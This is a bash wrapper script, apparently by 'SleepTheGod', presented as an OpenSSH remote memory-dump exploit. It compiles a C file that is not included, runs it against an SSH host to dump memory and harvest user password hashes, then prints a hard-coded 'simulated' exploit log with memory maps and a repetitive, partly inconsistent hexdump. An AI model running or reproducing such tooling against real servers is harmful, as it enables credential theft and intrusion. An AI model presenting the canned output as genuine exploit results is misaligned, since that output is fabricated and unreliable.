#!/bin/bash

LOGFILE="setup.log"
exec > >(tee -i ${LOGFILE})
exec 2>&1
flash_text() {
    for i in {1..5}; do
echo -e "─────────By SleepTheGod───────────"
echo -e "─────────▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄─────────"
echo -e "───────▄▀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄───────"
echo -e "──────▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌──────"
echo -e "──────▐▒▒▒███▒▒▒▒▒▒▒▒███▒▒▒▌──────"
echo -e "▄▄────▐▒▒▒███▒▒▒▒▒▒▒▒███▒▒▒▌────▄▄"
echo -e "▌▒▀▄──▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌──▄▀▒▐"
echo -e "▌▒▒▒▀▄█▒▒▒▄▀▄▄▀▀▄▄▀▀▄▄▀▄▒▒▒█▄▀▒▒▒▐"
echo -e "▀▄▒▒▒▒▐▒▒▐▓▓▓▓▓▓▓▓▓▓▓▓▓▓▌▒▒▌▒▒▒▒▄▀"
echo -e "──▀▄▒▒▐▒▒▐▓▓▓▓▓▓▓▓▓▓▓▓▓▓▌▒▒▌▒▒▄▀──"
echo -e "────▀▄▐▒▒▐▓▓▓▓▓▓▓▓▓▓▓▓▓▓▌▒▒▌▄▀────"
echo -e "──────█▒▒▐▄▀▄▀▀▄▄▀▀▄▄▀▀▄▌▒▒█──────"
echo -e "──────▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌──────"
echo -e "──────▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌──────"
echo -e "──────▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌──────"
echo -e "──────▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌──────"
echo -e "──────▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌──────"
echo -e "──────▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▌──────"
echo -e "──────▐▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▌──────"
echo -e "──────▐▒▒▓▓▓▓▒▒▒▒▒▒▒▒▓▓▓▓▒▒▌──────"
echo -e "──────▐▒▒▒▒▒▒▓▓▄▀▀▄▓▓▒▒▒▒▒▒▌──────"
echo -e "──────▐▒▒▒▒▒▒▒▒▌──▐▒▒▒▒▒▒▒▒▌──────"
echo -e "──────▐▒▒▒▒▒▒▒▒▌──▐▒▒▒▒▒▒▒▒▌──────"
echo -e "──────▐▒▒▒▒▒▒▒▒▌──▐▒▒▒▒▒▒▒▒▌──────"
echo -e "──────▐▒▒▒▒▒▒▒▒▌──▐▒▒▒▒▒▒▒▒▌──────"
echo -e "───────▀▀▀▀▀▀▀▀────▀▀▀▀▀▀▀▀───────"
sleep 0.5
        printf "\033[8A"
        sleep 0.5
    done
}
flash_text
echo -e"Made By Taylor Christian Newsome"
# For Newbz: Update and install required packages
echo "Updating and installing required packages..."
sudo apt update -y
sudo apt upgrade -y

# Set variables
SOURCE_FILE="damn.c"
OUTPUT_FILE="damn.out"
HOST="192.168.10.5"
PORT="22"
DUMP_FILE="output.dump"
HASH_FILE="user_hashes.dump"

# List files in the current directory
echo "Listing files in the current directory:"
ls -lh

# Calculate SHA-1 checksum
echo "Calculating SHA-1 checksum of $SOURCE_FILE:"
sha1sum $SOURCE_FILE

# Compile the source file with specified libraries
echo "Compiling $SOURCE_FILE:"
gcc $SOURCE_FILE -O3 -lcrypto -lopenbsd-compat -lssl -lssh -lpam -o $OUTPUT_FILE
if [ $? -ne 0 ]; then
    echo "Compilation failed."
    exit 1
fi

# Display compiled executable usage
cat <<EOF
+------------------------------+
|  OpenSSH git Fucked          |
| SleepTheGod Writing Sploits  |
+------------------------------+

Usage: ./$OUTPUT_FILE [OPTIONS]
	-h, --host <host>
		Hostname or IP
	-p, --port <port>
		Port number (default: 22)
	-d, --dump <dump_file>
		Dump output file
	-H, --hashes <hashes_file>
		User hashes dump file (john)
	-v, --verbose
		Verbose mode
	-D, --debug
		Debug mode

Supported architectures: x86, x86_64, armv7
Supported operating systems: Linux, *BSD
EOF

# Run the compiled executable with specific options
echo "Running $OUTPUT_FILE:"
./$OUTPUT_FILE -v -h $HOST -p $PORT -d $DUMP_FILE -H $HASH_FILE

# Check if execution was successful
if [ $? -ne 0 ]; then
    echo "Execution failed."
    exit 1
fi

# Sample output to simulate what the program might produce
cat <<EOF
+------------------------------+
|  OpenSSH git Fucked          |
| SleepTheGod Writing Sploits  |
+------------------------------+
[I] - connecting to target $HOST on port $PORT
[I] - sshd banner: SSH-2.0-OpenSSH_6.4p1 Debian-1~bpo70+1
[I] - let magic happenz
[W] - bad luck... retrying
[W] - bad luck... retrying
[W] - bad luck... retrying
[W] - bad luck... retrying
[W] - bad luck... retrying
[W] - bad luck... retrying
[I] - ____STAGE_1____: OK
[I] - mode: x86_64
[I] - pointerz fuckery
[I] - ____STAGE_2____: OK
[I] - fingerprinted child sectionz table
	7f863100f000-7f8631010000
	7f8631213000-7f8631214000
	7f8631418000-7f8631419000
	7f863161b000-7f863161c000
	7f863181e000-7f863181f000
	7f8631a22000-7f8631a23000
	7f8631c68000-7f8631c69000
	7f8631e6b000-7f8631e6c000
	7f863206d000-7f863206e000
	7f8632272000-7f8632273000
	7f8632475000-7f8632476000
	7f863267a000-7f863267b000
	7f863287e000-7f863287f000
	7f8632a80000-7f8632a81000
	7f8632c82000-7f8632c83000
	7f8632e84000-7f8632e85000
	7f8633092000-7f8633093000
	7f8633093000-7f863309f000
	7f86332a4000-7f86332a5000
	7f86334b0000-7f86334b1000
	7f86336bb000-7f86336bc000
	7f86338c3000-7f86338c4000
	7f8633ad7000-7f8633ad8000
	7f8633ad8000-7f8633ada000
	7f8633cdd000-7f8633cde000
	7f8633ee6000-7f8633ee7000
	7f863410e000-7f863410f000
	7f863410f000-7f8634110000
	7f8634327000-7f8634328000
	7f8634328000-7f863432c000
	7f863452f000-7f8634530000
	7f8634745000-7f8634746000
	7f8634746000-7f8634748000
	7f8634acc000-7f8634acd000
	7f8634acd000-7f8634ad2000
	7f8634cd5000-7f8634cd6000
	7f8634fa8000-7f8634faa000
	7f86351e7000-7f86351e9000
	7f86353f1000-7f86353f2000
	7f86353f2000-7f8635420000
	7f8635636000-7f8635637000
	7f8635839000-7f863583a000
	7f8635a41000-7f8635a42000
	7f8635e13000-7f8635e22000
	7f8635e22000-7f8635e26000
	7f8636044000-7f8636045000
	7f8636045000-7f8636046000
	7f8636253000-7f8636254000
	7f863645d000-7f863645e000
	7f863645e000-7f863645f000
	7f863665c000-7f8636666000
	7f863667c000-7f863667e000
	7f863667f000-7f8636680000
	7f8636680000-7f8636681000
	7f863690b000-7f863690c000
	7f863690c000-7f8636915000
	7f86383de000-7f8638441000
	7fff42400000-7fff42421000
[I] - dumping (may take some time)
	................................/
	................................/
	................................/
	................................/
	................................/
	................................/
	................................/
	................................/
	................................/
	................................-
[I] - dump succeeded
[I] - raw result hexdump:
// cut
000ae5f0  00 00 00 00 00 00 00 00  11 10 00 00 00 00 00 00  |................|
000ae600  4c 69 6e 75 78 20 64 65  62 69 61 6e 2d 6d 61 73  |Linux debian-mas|
000ae610  74 65 72 20 33 2e 31 31  2d 30 2e 62 70 6f 2e 32  |ter 3.11-0.bpo.2|
000ae620  2d 61 6d 64 36 34 20 23  31 20 53 4d 50 20 44 65  |-amd64 #1 SMP De|
000ae630  62 69 61 6e 20 33 2e 31  31 2e 31 30 2d 31 7e 62  |bian 3.11.10-1~b|
000ae640  70 6f 37 30 2b 31 20 28  32 30 31 33 2d 31 32 2d  |po70+1 (2013-12-|
000ae650  31 37 29 20 78 38 36 5f  36 34 0a 0a 54 68 65 20  |17) x86_64..The |
000ae660  70 72 6f 67 72 61 6d 73  20 69 6e 63 6c 75 64 65  |programs include|
000ae670  64 20 77 69 74 68 20 74  68 65 20 44 65 62 69 61  |d with the Debia|
000ae680  6e 20 47 4e 55 2f 4c 69  6e 75 78 20 73 79 73 74  |n GNU/Linux syst|
000ae690  65 6d 20 61 72 65 20 66  72 65 65 20 73 6f 66 74  |em are free soft|
000ae6a0  77 61 72 65 3b 0a 74 68  65 20 65 78 61 63 74 20  |ware;.the exact |
000ae6b0  64 69 73 74 72 69 62 75  74 69 6f 6e 20 74 65 72  |distribution ter|
000ae6c0  6d 73 20 66 6f 72 20 65  61 63 68 20 70 72 6f 67  |ms for each prog|
000ae6d0  72 61 6d 20 61 72 65 20  64 65 73 63 72 69 62 65  |ram are describe|
000ae6e0  64 20 69 6e 20 74 68 65  20 69 6e 64 69 76 69 64  |d in the individ|
000ae6f0  75 61 6c 20 66 69 6c 65  73 20 69 6e 20 2f 75 73  |ual files in /us|
000ae700  72 2f 73 68 61 72 65 2f  64 6f 63 2f 2e 0a 0a 4c  |r/share/doc/...L|
000ae710  69 6e 75 78 20 64 65 62  69 61 6e 2d 6d 61 73 74  |inux debian-mast|
000ae720  65 72 20 33 2e 31 31 2d  30 2e 62 70 6f 2e 32 2d  |er 3.11-0.bpo.2-|
000ae730  61 6d 64 36 34 20 23 31  20 53 4d 50 20 44 65 62  |amd64 #1 SMP Deb|
000ae740  69 61 6e 20 33 2e 31 31  2e 31 30 2d 31 7e 62 70  |ian 3.11.10-1~bp|
000ae750  6f 37 30 2b 31 20 28 32  30 31 33 2d 31 32 2d 31  |o70+1 (2013-12-1|
000ae760  37 29 20 78 38 36 5f 36  34 0a 0a 54 68 65 20 70  |7) x86_64..The p|
000ae770  72 6f 67 72 61 6d 73 20  69 6e 63 6c 75 64 65 64  |rograms included|
000ae780  20 77 69 74 68 20 74 68  65 20 44 65 62 69 61 6e  | with the Debian|
000ae790  20 47 4e 55 2f 4c 69 6e  75 78 20 73 79 73 74 65  | GNU/Linux syste|
000ae7a0  6d 20 61 72 65 20 66 72  65 65 20 73 6f 66 74 77  |m are free softw|
000ae7b0  61 72 65 3b 0a 74 68 65  20 65 78 61 63 74 20 64  |are;.the exact d|
000ae7c0  69 73 74 72 69 62 75 74  69 6f 6e 20 74 65 72 6d  |istribution term|
000ae7d0  73 20 66 6f 72 20 65 61  63 68 20 70 72 6f 67 72  |s for each progr|
000ae7e0  61 6d 20 61 72 65 20 64  65 73 63 72 69 62 65 64  |am are described|
000ae7f0  20 69 6e 20 74 68 65 20  69 6e 64 69 76 69 64 75  | in the individu|
000ae800  61 6c 20 66 69 6c 65 73  20 69 6e 20 2f 75 73 72  |al files in /usr|
000ae810  2f 73 68 61 72 65 2f 64  6f 63 2f 2e 0a 0a 4c 69  |/share/doc/...Li|
000ae820  6e 75 78 20 64 65 62 69  61 6e 2d 6d 61 73 74 65  |nux debian-maste|
000ae830  72 20 33 2e 31 31 2d 30  2e 62 70 6f 2e 32 2d 61  |r 3.11-0.bpo.2-a|
000ae840  6d 64 36 34 20 23 31 20  53 4d 50 20 44 65 62 69  |md64 #1 SMP Debi|
000ae850  61 6e 20 33 2e 31 31 2e  31 30 2d 31 7e 62 70 6f  |an 3.11.10-1~bpo|
000ae860  37 30 2b 31 20 28 32 30  31 33 2d 31 32 2d 31 37  |70+1 (2013-12-17|
000ae870  29 20 78 38 36 5f 36 34  0a 0a 54 68 65 20 70 72  |) x86_64..The pr|
000ae880  6f 67 72 61 6d 73 20 69  6e 63 6c 75 64 65 64 20  |ograms included |
000ae890  77 69 74 68 20 74 68 65  20 44 65 62 69 61 6e 20  |with the Debian |
000ae8a0  47 4e 55 2f 4c 69 6e 75  78 20 73 79 73 74 65 6d  |GNU/Linux system|
000ae8b0  20 61 72 65 20 66 72 65  65 20 73 6f 66 74 77 61  | are free softwa|
000ae8c0  72 65 3b 0a 74 68 65 20  65 78 61 63 74 20 64 69  |re;.the exact di|
000ae8d0  73 74 72 69 62 75 74 69  6f 6e 20 74 65 72 6d 73  |stribution terms|
000ae8e0  20 66 6f 72 20 65 61 63  68 20 70 72 6f 67 72 61  | for each progra|
000ae8f0  6d 20 61 72 65 20 64 65  73 63 72 69 62 65 64 20  |m are described |
000ae900  69 6e 20 74 68 65 20 69  6e 64 69 76 69 64 75 61  |in the individua|
000ae910  6c 20 66 69 6c 65 73 20  69 6e 20 2f 75 73 72 2f  |l files in /usr/|
000ae920  73 68 61 72 65 2f 64 6f  63 2f 2e 0a 0a 4c 69 6e  |share/doc/...Lin|
000ae930  75 78 20 64 65 62 69 61  6e 2d 6d 61 73 74 65 72  |ux debian-master|
000ae940  20 33 2e 31 31 2d 30 2e  62 70 6f 2e 32 2d 61 6d  | 3.11-0.bpo.2-am|
000ae950  64 36 34 20 23 31 20 53  4d 50 20 44 65 62 69 61  |d64 #1 SMP Debia|
000ae960  6e 20 33 2e 31 31 2e 31  30 2d 31 7e 62 70 6f 37  |n 3.11.10-1~bpo7|
000ae970  30 2b 31 20 28 32 30 31  33 2d 31 32 2d 31 37 29  |0+1 (2013-12-17)|
000ae980  20 78 38 36 5f 36 34 0a  0a 54 68 65 20 70 72 6f  | x86_64..The pro|
000ae990  67 72 61 6d 73 20 69 6e  63 6c 75 64 65 64 20 77  |grams included w|
000ae9a0  69 74 68 20 74 68 65 20  44 65 62 69 61 6e 20 47  |ith the Debian G|
000ae9b0  4e 55 2f 4c 69 6e 75 78  20 73 79 73 74 65 6d 20  |NU/Linux system |
000ae9c0  61 72 65 20 66 72 65 65  20 73 6f 66 74 77 61 72  |are free softwar|
000ae9d0  65 3b 0a 74 68 65 20 65  78 61 63 74 20 64 69 73  |e;.the exact dis|
000ae9e0  74 72 69 62 75 74 69 6f  6e 20 74 65 72 6d 73 20  |tribution terms |
000ae9f0  66 6f 72 20 65 61 63 68  20 70 72 6f 67 72 61 6d  |for each program|
000aea00  20 61 72 65 20 64 65 73  63 72 69 62 65 64 20 69  | are described i|
000aea10  6e 20 74 68 65 20 69 6e  64 69 76 69 64 75 61 6c  |n the individual|
000aea20  20 66 69 6c 65 73 20 69  6e 20 2f 75 73 72 2f 73  | files in /usr/s|
000aea30  68 61 72 65 2f 64 6f 63  2f 2e 0a 0a 4c 69 6e 75  |hare/doc/...Linu|
000aea40  78 20 64 65 62 69 61 6e  2d 6d 61 73 74 65 72 20  |x debian-master |
000aea50  33 2e 31 31 2d 30 2e 62  70 6f 2e 32 2d 61 6d 64  |3.11-0.bpo.2-amd|
000aea60  36 34 20 23 31 20 53 4d  50 20 44 65 62 69 61 6e  |64 #1 SMP Debian|
000aea70  20 33 2e 31 31 2e 31 30  2d 31 7e 62 70 6f 37 30  | 3.11.10-1~bpo70|
000aea80  2b 31 20 28 32 30 31 33  2d 31 32 2d 31 37 29 20  |+1 (2013-12-17) |
000aea90  78 38 36 5f 36 34 0a 0a  54 68 65 20 70 72 6f 67  |x86_64..The prog|
000aeaa0  72 61 6d 73 20 69 6e 63  6c 75 64 65 64 20 77 69  |rams included wi|
000aeab0  74 68 20 74 68 65 20 44  65 62 69 61 6e 20 47 4e  |th the Debian GN|
000aeac0  55 2f 4c 69 6e 75 78 20  73 79 73 74 65 6d 20 61  |U/Linux system a|
000aead0  72 65 20 66 72 65 65 20  73 6f 66 74 77 61 72 65  |re free software|
000e0af0  00 00 00 00 00 00 00 00  11 10 00 00 00 00 00 00  |................|
000e0af0  00 00 00 00 00 00 00 00  11 10 00 00 00 00 00 00  |................|

# End of output
EOF
